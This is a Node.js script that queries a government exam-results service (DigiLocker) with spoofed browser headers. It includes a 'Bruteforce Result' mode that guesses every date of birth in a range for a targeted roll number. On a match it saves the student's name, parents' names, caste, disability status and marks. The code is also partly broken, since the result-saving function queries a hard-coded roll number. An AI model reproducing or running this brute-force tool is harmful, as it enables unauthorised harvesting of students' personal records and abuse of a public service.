const { fetch } = require('undici');
const util = require('util');
const fs = require('fs');
const readline = require('readline');
const { stdin: input, stdout: output } = require('process');

const intf = readline.createInterface({ input, output });
var prompt = util.promisify(intf.question);
/*
class Result {
    constructor(result) {
    }
}
*/

/**
 * 
 * @param {number} roll 
 * @param {[dd,mm,yyyy]} dob 
 * @param {number} yearofresult 
 * @returns {}
 */
const checkresult = async (roll,[dd,mm,yyyy],year=2024) => {
    const req = await fetch("https://results.digilocker.gov.in/results/MetaData", {
        "credentials": "include",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-GPC": "1",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        },
        "body": `rroll=${roll}&doctype=SSCER&dob=`+encodeURIComponent(`${dd}/${mm}/${yyyy}`)+`&year=${year}`,
        "method": "POST",
        "mode": "cors"
    });
    const res = await req.text();
    const json = JSON.parse(res);
    if (res.includes('!')) {
        //console.log(roll,false,res,[dd,mm,yyyy]);
        return {error:res.includes('!')}
    } else {
        return json;
    }
}
prompt = (query) => {
    return new Promise(resolve => {
        intf.question(query, resolve);
    });
}
function generatedob([dd1, mm1, yyyy1], [dd2, mm2, yyyy2]) {
    var startDate = new Date(yyyy1, mm1 - 1, dd1);
    var endDate = new Date(yyyy2, mm2 - 1, dd2);

    var datesArray = [];

    var currentDate = startDate;
    while (currentDate <= endDate) {
        datesArray.push(currentDate.toLocaleDateString({region:'IN'}));

        currentDate.setDate(currentDate.getDate() + 1);
    }
    //console.log(datesArray)
    return datesArray;
}
function parseResult(result) {
    //console.log(result);
    return (result.DocDetails.MetadataContent)
}
const success = async (roll,dob ) => {
    const [dd,mm,yyyy] = dob;
    const result = parseResult(await checkresult(22309229,[dd,mm,yyyy]));
    const fn = roll+dob.join('')+'.json';
    const formattedresult = {
        roll:result['RROLL'],
        name:result['CNAME'],
        mname:result['MNAME'],
        fname:result['FNAME'],
        dob:dob.join('/'),
        sex:result['SEX'],
        caste:result['SCST'],
        handicap:result['HAND'],
        pass:result['RES'],
        session:result['SESSION'],
        skill:result['SKILL'],
        school:result['SCH_NAME'],
        scores:[
            {
                name:result['SUB1NM'],
                theory:result['MRK11'],
                internal:result['MRK12'],
                total:result['MRK13']
            },{
                name:result['SUB2NM'],
                theory:result['MRK21'],
                internal:result['MRK22'],
                total:result['MRK23']
            },
            {
                name:result['SUB3NM'],
                theory:result['MRK31'],
                internal:result['MRK32'],
                total:result['MRK33']
            },{
                name:result['SUB4NM'],
                theory:result['MRK41'],
                internal:result['MRK42'],
                total:result['MRK43']
            },{
                name:result['SUB5NM'],
                theory:result['MRK51'],
                internal:result['MRK52'],
                total:result['MRK53']
            },{
                name:result['SUB6NM'],
                theory:result['MRK61'],
                internal:result['MRK62'],
                total:result['MRK63']
            },{
                name:result['SUB7NM'],
                theory:result['MRK71'],
                internal:result['MRK72'],
                total:result['MRK73']
            },
        ],
        total:result['TMRK']
    }
    //console.log(formattedresult);
    fs.writeFileSync(fn.replace('.','-pretty.'),JSON.stringify(formattedresult,0,2));
    console.log('saved result to',fn);
    const fresult = {...formattedresult};
    delete fresult.scores
    console.table(fresult);
    console.table(formattedresult.scores)
};

(async function main() {
    /**@type {string} */
    const ans = await prompt('Select an Numeric Option:\n[1]: Check Result\n[2]: Bruteforce Result\n-> ');
    switch (ans) {
        case '1':
            const roll = await prompt('Roll: ');
            const dob = await prompt('Dob[DD/MM/YYYY]: ');
            const rdob = [dob.split('/')[0]*1,dob.split('/')[1]*1,dob.split('/')[2]*1]
            const res = await checkresult(roll,rdob);
            if (res.error) {
                console.log('wrong information')
                main()
            } else {
                success(roll,rdob);
            }

            break;
        case '2':
                const r = await prompt('Target Roll Number: ');
                const fr = await prompt('DOB Range From(to guess)[DD/MM/YYYY]: ');
                const t = await prompt('DOB Range to[DD/MM/YYYY]: ');
                
                const frp = [fr.split('/')[0]*1,fr.split('/')[1]*1,fr.split('/')[2]*1];
                const tp = [t.split('/')[0]*1,t.split('/')[1]*1,t.split('/')[2]*1];
                console.log('checking...')
                generatedob(frp,tp).forEach(async dobf => {
                    const dob = dobf.split('/');
                    const [dd,mm,yyyy] = [dob[1],dob[0],dob[2]]
                    const rz = await checkresult(r,[dd,mm,yyyy]);
                    if (rz.error) {

                    } else {
                        console.log('Found Dob:',[dd,mm,yyyy]);
                        success(r,[dd,mm,yyyy]);
                    }
                })
            break
        default:
            console.log('invalid option');
            main();
            break;
    }
})();